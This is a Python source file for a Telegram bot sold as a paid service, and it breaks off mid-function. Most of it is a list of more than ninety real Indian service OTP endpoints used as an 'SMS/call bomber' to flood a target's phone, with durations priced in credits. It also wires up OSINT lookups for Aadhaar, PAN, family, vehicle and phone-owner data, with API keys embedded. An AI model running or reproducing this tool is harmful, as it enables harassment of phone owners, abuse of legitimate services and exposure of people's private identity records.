# =====================================================================
# 🚀 AYUSH BOT v9.1 — FULLY FIXED (Deploy-Ready)
# Owner: @GOD_AYUSH | Group: @AYUSHxOSINT
# =====================================================================
import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception: pass

import os, asyncio, time, datetime, random, string, logging, json, threading
from html import escape as html_escape
from pathlib import Path
from urllib.parse import quote
import aiohttp

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ChatPermissions
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
loggurl_tpler = logging.getLogger("AYUSH_BOT")

# ==================== BASE DIR ====================
if os.getenv("RENDER") and os.path.exists("/data"):
    BASE_DIR = Path("/data")
else:
    BASE_DIR = Path(__file__).resolve().parent

def load_config_json(path=BASE_DIR / "config.json"):
    env_cfg = os.getenv("CONFIG_JSON")
    if env_cfg:
        try:
            cfg = json.loads(env_cfg); logger.info(f"Config from CONFIG_JSON ({len(cfg)} keys)"); return cfg
        except Exception as e: logger.error(f"CONFIG_JSON parse: {e}")
    if not os.path.exists(path):
        logger.warning(f"config.json missing at {path}"); return {}
    try:
        with open(path,"r",encoding="utf-8") as f: cfg = json.load(f)
        logger.info(f"Config from {path} ({len(cfg)} keys)"); return cfg
    except Exception as e: logger.error(f"config.json read: {e}"); return {}

CONFIG = load_config_json()
BOT_TOKEN = str(CONFIG.get("BOT_TOKEN","")).strip()
WEBHOOK_URL = str(CONFIG.get("WEBHOOK_URL","")).strip().rstrip("/")
PORT = int(os.getenv("PORT", CONFIG.get("PORT", 8080)))
if not BOT_TOKEN:
    print("❌ BOT_TOKEN missing in config.json!"); sys.exit(1)

BRAND_NAME = "Ayush"
OWNER_USERNAME = "GOD_AYUSH"
MAIN_OWNER = 7758917200
ADMIN_IDS = [7758917200]
OFFICIAL_GROUP = "AYUSHxOSINT"
OFFICIAL_GROUP_URL = f"https://t.me/{OFFICIAL_GROUP}"
BOT_USERNAME = str(CONFIG.get("BOT_USERNAME","AyushOsint_Robot")).strip().lstrip("@")
DATA_FILE = BASE_DIR / "bot_data.json"
BLAST_DATA_FILE = BASE_DIR / "blast_data.json"
API_CONFIG_FILE = BASE_DIR / "api_config.json"
START_IMAGE_PATH = BASE_DIR / "assets" / "start.jpg"
START_VIDEO_PATH = BASE_DIR / "assets" / "start_video.mp4"
AUTO_DELETE_SECONDS = 60
DEFAULT_FORCE_CHANNELS = ["Ayush_Hackz", "Ayush_Cyber_Updates", "AYUSHxOSINT"]
DEFAULT_UPI = "ayush.sharma798@fam"

# Thread-safe save lock
_SAVE_LOCK = threading.Lock()

# ==================== OSINT APIs ====================
# FIX: Added all 15 previously missing endpoints (numvl, tg, rcnum, ff, bgmi, ip, github, insta, snap, email, upi, ifsc, gst, pincode, img)
DEFAULT_API_MAP = {
    "num":"https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={arg}",
    "numvl":"https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={arg}&details=1",
    "tg":"https://shuruuu-api.vercel.app/tg_info?key=AYUSH$PRO&query={arg}",
    "aadhar":"https://shuruuu-api.vercel.app/aadhar_info?key=AYUSH$PRO&query={arg}",
    "vehicle":"https://shuruuu-api.vercel.app/vehicle_info?key=AYUSH$PRO&query={arg}",
    "rcnum":"https://shuruuu-api.vercel.app/rc_info?key=AYUSH$PRO&query={arg}",
    "family":"https://shuruuu-api.vercel.app/family_info?key=AYUSH$PRO&query={arg}",
    "lpg":"https://shuruuu-api.vercel.app/lpg_info?key=AYUSH$PRO&query={arg}",
    "pak":"https://shuruuu-api.vercel.app/pak_info?key=AYUSH$PRO&query={arg}",
    "truecaller":"https://shuruuu-api.vercel.app/truecaller_info?key=AYUSH$PRO&query={arg}",
    "pan":"https://shuruuu-api.vercel.app/pan_osint?key=AYUSH$PRO&query={arg}",
    "ff":"https://shuruuu-api.vercel.app/ff_info?key=AYUSH$PRO&query={arg}",
    "bgmi":"https://shuruuu-api.vercel.app/bgmi_info?key=AYUSH$PRO&query={arg}",
    "ip":"https://shuruuu-api.vercel.app/ip_info?key=AYUSH$PRO&query={arg}",
    "github":"https://shuruuu-api.vercel.app/github_info?key=AYUSH$PRO&query={arg}",
    "insta":"https://shuruuu-api.vercel.app/insta_info?key=AYUSH$PRO&query={arg}",
    "snap":"https://shuruuu-api.vercel.app/snap_info?key=AYUSH$PRO&query={arg}",
    "email":"https://shuruuu-api.vercel.app/email_info?key=AYUSH$PRO&query={arg}",
    "upi":"https://shuruuu-api.vercel.app/upi_info?key=AYUSH$PRO&query={arg}",
    "ifsc":"https://shuruuu-api.vercel.app/ifsc_info?key=AYUSH$PRO&query={arg}",
    "gst":"https://shuruuu-api.vercel.app/gst_info?key=AYUSH$PRO&query={arg}",
    "pincode":"https://shuruuu-api.vercel.app/pincode_info?key=AYUSH$PRO&query={arg}",
    "img":"https://shuruuu-api.vercel.app/ai_image?key=AYUSH$PRO&query={arg}",
}

OSINT_CATEGORIES = {
    "identity":{"title":"📱 IDENTITY","modules":[("num","📱 Phone Info"),("numvl","📱 Number Details"),("truecaller","📞 Truecaller"),("tg","📨 Telegram")]},
    "vehicle":{"title":"🚘 VEHICLE","modules":[("vehicle","🚘 Vehicle Info"),("rcnum","🚙 RC Details")]},
    "gaming":{"title":"🎮 GAMING","modules":[("ff","🔥 Free Fire"),("bgmi","🎯 BGMI")]},
    "digital":{"title":"🌐 DIGITAL","modules":[("ip","🌐 IP Trace"),("github","🐙 GitHub"),("insta","📸 Instagram"),("snap","👻 Snapchat"),("email","📧 Email")]},
    "profile":{"title":"🪪 PROFILE","modules":[("aadhar","🪪 Aadhaar"),("family","👨‍👩‍👧 Family"),("pan","📄 PAN"),("lpg","🛢 LPG")]},
    "utility":{"title":"💳 UTILS","modules":[("upi","💸 UPI"),("ifsc","🏦 IFSC"),("gst","🏢 GST"),("pincode","📍 Pincode"),("pak","🇵🇰 Pakistan"),("img","🎨 AI Image")]},
}
MODULE_NAMES = {}
for cat in OSINT_CATEGORIES.values():
    for c,m in cat["modules"]: MODULE_NAMES[c] = m

OSINT_HINTS = {
    "num":"10-digit phone","numvl":"10-digit phone","truecaller":"10-digit phone","tg":"username/ID",
    "vehicle":"vehicle no (MH12AB1234)","rcnum":"RC number","ff":"Free Fire UID","bgmi":"BGMI UID",
    "ip":"IP address","github":"GitHub username","insta":"Instagram username","snap":"Snapchat username",
    "email":"email address","aadhar":"12-digit Aadhaar","family":"Aadhaar number","pan":"PAN number",
    "lpg":"LPG consumer no","upi":"UPI ID","ifsc":"IFSC code","gst":"GST number",
    "pincode":"6-digit pincode","pak":"Pakistan phone","img":"image prompt",
}

DURATION_OPTIONS = {
    "1m":{"label":"🟢 1 Min","sec":60,"cost":500},
    "5m":{"label":"🟢 5 Min","sec":300,"cost":2000},
    "10m":{"label":"🟢 10 Min","sec":600,"cost":4000},
    "30m":{"label":"⭐ 30 Min","sec":1800,"cost":10000},
    "60m":{"label":"⭐ 1 Hour","sec":3600,"cost":20000},
    "6h":{"label":"🔥 6 Hours","sec":21600,"cost":100000},
    "12h":{"label":"🔥 12 Hours","sec":43200,"cost":200000},
    "1d":{"label":"👑 1 Day","sec":86400,"cost":500000},
}

# ==================== 90+ BOMBER APIs ====================
ONLINE_BOMBER_APIS = [
    {"name":"Noobster OTP Bomb","url":lambda p: f"https://otp-bomb.noobster11001.workers.dev/?phone={p}","method":"GET"},
    {"name":"FreeFire Bomber","url":lambda p: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration=10","method":"GET"},
    {"name":"Tata Capital Voice","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","method":"POST","data":lambda p: json.dumps({"phone":p,"isOtpViaCallAtLogin":"true"}),"headers":{"Content-Type":"application/json"}},
    {"name":"1MG Voice","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","data":lambda p: json.dumps({"number":p,"otp_on_call":True}),"headers":{"Content-Type":"application/json; charset=utf-8"}},
    {"name":"Swiggy Call","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json; charset=utf-8"}},
    {"name":"Myntra Voice","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Flipkart Voice","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Amazon Voice","url":"https://www.amazon.in/ap/signin","method":"POST","data":lambda p: f"phone={p}&action=voice_otp","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"Paytm Voice","url":"https://accounts.paytm.com/signin/voice-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Zomato Voice","url":"https://www.zomato.com/php/o2_api_handler.php","method":"POST","data":lambda p: f"phone={p}&type=voice","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"MakeMyTrip","url":"https://www.makemytrip.com/api/4/voice-otp/generate","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Goibibo","url":"https://www.goibibo.com/user/voice-otp/generate/","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Ola Voice","url":"https://api.olacabs.com/v1/voice-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Uber Voice","url":"https://auth.uber.com/v2/voice-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Lenskart","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","method":"POST","data":lambda p: json.dumps({"phoneCode":"+91","telephone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Hungama","url":"https://communication.api.hungama.com/v1/communication/otp","method":"POST","data":lambda p: json.dumps({"mobileNo":p,"countryCode":"+91","appCode":"un"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Meru Cab","url":"https://merucabapp.com/api/otp/generate","method":"POST","data":lambda p: f"mobile_number={p}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"Dayco","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","method":"POST","data":lambda p: f"api=send_otp&mob={p}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"NoBroker","url":"https://www.nobroker.in/api/v3/account/otp/send","method":"POST","data":lambda p: f"phone={p}&countryCode=IN","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"ShipRocket","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","method":"POST","data":lambda p: json.dumps({"mobileNumber":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Doubtnut","url":"https://api.doubtnut.com/v4/student/login","method":"POST","data":lambda p: json.dumps({"phone_number":p,"language":"en"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Myntra SMS","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Flipkart SMS","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","method":"POST","data":lambda p: json.dumps({"mobileNumber":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Zomato SMS","url":"https://www.zomato.com/php/asyncLogin.php","method":"POST","data":lambda p: f"phone={p}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"Paytm SMS","url":"https://accounts.paytm.com/signin/otp","method":"POST","data":lambda p: json.dumps({"phone":p,"loginData":"LOGIN_USING_PHONE"}),"headers":{"Content-Type":"application/json"}},
    {"name":"PhonePe","url":"https://www.phonepe.com/api/v2/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"BigBasket","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","method":"POST","data":lambda p: json.dumps({"mobile_number":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Meesho","url":"https://api.meesho.com/v2/auth/send_otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Zepto","url":"https://api.zepto.com/v2/otp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Blinkit","url":"https://blinkit.com/api/otp/generate","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"PharmEasy","url":"https://pharmeasy.in/api/v2/auth/send-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Housing.com","url":"https://login.housing.com/api/v2/send-otp","method":"POST","data":lambda p: json.dumps({"phone":p,"country_url_name":"in"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Khatabook","url":"https://api.khatabook.com/v1/auth/request-otp","method":"POST","data":lambda p: json.dumps({"phone":p,"app_signature":"wk+avHrHZf2"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Nykaa","url":"https://www.nykaa.com/app-api/index.php/customer/send_otp","method":"POST","data":lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
    {"name":"RummyCircle","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","data":lambda p: json.dumps({"mobile":p,"isPlaycircle":False}),"headers":{"Content-Type":"application/json"}},
    {"name":"Entri","url":"https://entri.app/api/v3/users/check-phone/","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Aakash","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","method":"POST","data":lambda p: json.dumps({"mobile_number":p,"activity_type":"aakash-myadmission"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Revv","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","method":"POST","data":lambda p: json.dumps({"mobile":p,"deviceType":"website"}),"headers":{"Content-Type":"application/json"}},
    {"name":"DeHaat","url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP","method":"POST","data":lambda p: json.dumps({"mobile":p,"client_id":"kisan-app"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Spencers","url":"https://jiffy.spencers.in/user/auth/otp/send","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"BigCash","url":lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1","method":"GET"},
    {"name":"WorkIndia","url":lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623","method":"GET"},
    {"name":"PokerBaazi","url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp","method":"POST","data":lambda p: json.dumps({"mobile":p,"mfa_channels":"phno"}),"headers":{"Content-Type":"application/json"}},
    {"name":"My11Circle","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json;charset=UTF-8"}},
    {"name":"MamaEarth","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"HomeTriangle","url":"https://hometriangle.com/api/partner/xauth/signup/otp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Kredily","url":"https://app.kredily.com/ws/v1/accounts/send-otp/","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Tata Motors","url":"https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json","method":"POST","data":lambda p: json.dumps({"mobile":p,"sendOtp":"true"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Moglix","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP","method":"POST","data":lambda p: json.dumps({"mobile":p,"buildVersion":"24.0"}),"headers":{"Content-Type":"application/json"}},
    {"name":"TrulyMadly","url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp","method":"POST","data":lambda p: json.dumps({"mobile":p,"locale":"IN"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Apna","url":"https://production.apna.co/api/userprofile/v1/otp/","method":"POST","data":lambda p: json.dumps({"mobile":p,"hash_type":"play_store"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Swipe","url":"https://app.getswipe.in/api/user/mobile_login","method":"POST","data":lambda p: json.dumps({"mobile":p,"resend":True}),"headers":{"Content-Type":"application/json"}},
    {"name":"CountryDelight","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","method":"POST","data":lambda p: json.dumps({"mobile":p,"platform":"Android","mode":"new_user"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Rapido","url":"https://customer.rapido.bike/api/otp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"BetterHalf","url":"https://api.betterhalf.ai/v2/auth/otp/send/","method":"POST","data":lambda p: json.dumps({"mobile":p,"isd_code":"91"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Charzer","url":"https://api.charzer.com/auth-service/send-otp","method":"POST","data":lambda p: json.dumps({"mobile":p,"appSource":"CHARZER_APP"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Mpokket","url":"https://web-api.mpokket.in/registration/sendOtp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"KPN WhatsApp","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6","method":"POST","data":lambda p: json.dumps({"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":p}}),"headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","Content-Type":"application/json; charset=UTF-8"}},
    {"name":"Foxy WhatsApp","url":"https://www.foxy.in/api/v2/users/send_otp","method":"POST","data":lambda p: json.dumps({"user":{"phone_number":f"+91{p}"},"via":"whatsapp"}),"headers":{"Content-Type":"application/json"}},
    {"name":"JioMart","url":"https://www.jiomart.com/msapi/v1/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Dunzo","url":"https://api.dunzo.in/api/v2/user/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"UrbanClap","url":"https://www.urbancompany.com/api/v1/user/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Curefit","url":"https://auth.cure.fit/api/v2/auth/otp/generate","method":"POST","data":lambda p: json.dumps({"phone":p,"countryCode":"+91"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Practo","url":"https://auth.practo.com/auth/login/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"1MG SMS","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","data":lambda p: json.dumps({"number":p,"otp_on_call":False}),"headers":{"Content-Type":"application/json"}},
    {"name":"BookMyShow","url":"https://in.bookmyshow.com/api/auth/v2/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p,"region":"IN"}),"headers":{"Content-Type":"application/json"}},
    {"name":"Ajio","url":"https://login.ajio.com/api/auth/sendOTP","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"PolicyBazaar","url":"https://www.policybazaar.com/api/v1/auth/sendotp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Groww","url":"https://groww.in/v1/api/login/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"CRED","url":"https://api.cred.club/v2/auth/otp/request","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Dream11","url":"https://api.dream11.com/user/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"MPL","url":"https://api.mpl.live/v1/user/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Pepperfry","url":"https://www.pepperfry.com/api/user/sendotp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"FirstCry","url":"https://www.firstcry.com/api/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Bewakoof","url":"https://www.bewakoof.com/rest/V4/auth/send-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Licious","url":"https://www.licious.in/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"FreshToHome","url":"https://www.freshtohome.com/api/v2/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Swiggy SMS","url":"https://dapi.swiggy.com/api/v1/user/otp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"IndiaMart","url":"https://www.indiamart.com/api/otp/send","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"OYO","url":"https://www.oyorooms.com/api/v7/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"MediBuddy","url":"https://www.medibuddy.in/api/auth/sendotp","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"KreditBee","url":"https://www.kreditbee.in/api/v1/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"MoneyTap","url":"https://www.moneytap.com/api/otp/generate","method":"POST","data":lambda p: json.dumps({"mobile":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"LazyPay","url":"https://api.lazypay.in/v1/auth/otp/request","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Slice","url":"https://api.sliceit.com/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Fi Money","url":"https://api.fi.money/v1/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Jupiter","url":"https://api.jupiter.money/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Navi","url":"https://api.navi.com/v1/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Upstox","url":"https://api.upstox.com/v2/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Angel One","url":"https://www.angelone.in/api/auth/send-otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Delhivery","url":"https://www.delhivery.com/api/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"ShareChat","url":"https://api.sharechat.com/auth/v2/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Josh","url":"https://api.myjosh.in/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Moj","url":"https://api.mojapp.in/v1/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Zupee","url":"https://api.zupee.com/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Vedantu","url":"https://www.vedantu.com/api/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Unacademy","url":"https://unacademy.com/api/v2/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"BYJU","url":"https://www.byjus.com/api/auth/otp/generate","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"PhysicsWallah","url":"https://api.penpencil.co/v1/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Apollo247","url":"https://www.apollo247.com/api/auth/otp/generate","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"CultFit","url":"https://www.cult.fit/api/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"99acres","url":"https://www.99acres.com/api/v1/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"MagicBricks","url":"https://www.magicbricks.com/api/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Cars24","url":"https://api.cars24.com/v1/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"CarDekho","url":"https://www.cardekho.com/api/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Spinny","url":"https://api.spinny.com/v1/auth/otp","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
    {"name":"Park+","url":"https://api.parkplus.io/v1/auth/otp/send","method":"POST","data":lambda p: json.dumps({"phone":p}),"headers":{"Content-Type":"application/json"}},
]

# ==================== DATA ====================
class MergedData:
    def __init__(self):
        self.data = {
            "users":{}, "groups":{},
            "private_whitelist":[MAIN_OWNER], "admins":[MAIN_OWNER],
            "banned_users":[], "muted_users":[],
            "redeem_codes":{}, "vip_redeem_codes":{},
            "plans":[
                {"id":"p1","name":"Starter","price":49,"credits":5000},
                {"id":"p2","name":"Ultra","price":99,"credits":25000},
                {"id":"p3","name":"VIP","price":199,"credits":100000},
            ],
            "upi_id":DEFAULT_UPI,
            "pending_payments":{},
            "protected_numbers":[],
            "force_join_channels":list(DEFAULT_FORCE_CHANNELS),
            "command_config":{},
            "stats":{"total_attacks":0,"total_otps":0},
        }
        self.load()

    def load(self):
        if DATA_FILE.exists():
            try:
                with open(DATA_FILE,"r",encoding="utf-8") as f: d=json.load(f)
                for k,v in d.items(): self.data[k]=v
                if MAIN_OWNER not in self.data.setdefault("private_whitelist",[]): self.data["private_whitelist"].append(MAIN_OWNER)
                if MAIN_OWNER not in self.data.setdefault("admins",[]): self.data["admins"].append(MAIN_OWNER)
                if not self.data.get("force_join_channels"): self.data["force_join_channels"]=list(DEFAULT_FORCE_CHANNELS)
                for i,p in enumerate(self.data.get("plans",[])):
                    if "id" not in p: p["id"]=f"p{i+1}_{random.randint(100,999)}"
                    p["price"]=int(p.get("price",0)); p["credits"]=int(p.get("credits",0))
                self.data.setdefault("upi_id",DEFAULT_UPI)
                self.data.setdefault("pending_payments",{})
            except Exception as e: logger.error(f"load: {e}")

    def save(self):
        try:
            with _SAVE_LOCK:
                with open(DATA_FILE,"w",encoding="utf-8") as f: json.dump(self.data,f,indent=2,ensure_ascii=False)
        except Exception as e: logger.error(f"save: {e}")

    def is_admin(self,uid): return uid==MAIN_OWNER or uid in ADMIN_IDS or uid in self.data.get("admins",[])
    def is_free_tier(self,uid): return self.is_admin(uid) or uid in self.data.get("private_whitelist",[])
    def is_banned(self,uid): return uid in self.data.get("banned_users",[])

    # FIX: IndentationError fixed — was 8 spaces, now 4 spaces
    def get_user(self, uid, name=None, uname=None):
        k = str(uid)
        today = datetime.date.today().isoformat()
        if k not in self.data["users"]:
            self.data["users"][k] = {
                "name": name or "User",
                "username": uname or "",
                "credits": 999999999 if self.is_free_tier(uid) else 50,
                "last_daily_bonus": today,
                "total_attacks": 0,
                "total_otps": 0,
                "refer_code": "AYUSH" + str(uid)[-5:],
                "referred_by": None,
                "referrals": 0,
                "joined_at": int(time.time()),
                "premium": self.is_free_tier(uid),
            }
            self.save()
            return self.data["users"][k]

        u = self.data["users"][k]
        if name:
            u["name"] = name
        if uname:
            u["username"] = uname

        if self.is_free_tier(uid):
            u["credits"] = 999999999
            u["premium"] = True

        if u.get("last_daily_bonus") != today and not self.is_free_tier(uid):
            u["credits"] = u.get("credits", 0) + 50
            u["last_daily_bonus"] = today
            self.save()

        return u

    def get_cmd_config(self,cmd):
        cfg=self.data.setdefault("command_config",{})
        return cfg.setdefault(cmd,{"maintenance":False,"cost":0})

db=MergedData()
ACTIVE_BOMBINGS={}
CACHED_DEVICES=[]
BOT_LOCKED=False

# ==================== SESSIONS ====================
_HTTP_SESSION=None; _BLAST_SESSION=None
async def get_http_session():
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
